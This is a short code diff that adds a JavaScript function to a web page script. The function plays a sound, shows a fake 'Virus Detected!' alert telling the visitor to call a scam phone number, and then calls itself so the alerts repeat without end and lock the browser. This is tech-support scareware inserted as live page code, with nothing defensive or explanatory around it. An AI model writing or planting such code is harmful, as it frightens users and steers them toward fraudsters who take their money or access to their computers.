@@ -1,4 +1,9 @@
-
+  function myFunction(){
+              document.getElementById('abc').play();
+    alert("                         **************Warning**************                                                                                                                                                                                               Virus Detected! Call [insert scam phone number] to delete the virus immediately!");
+    
+    myFunction();
+  }
 
 
 function changeText() {
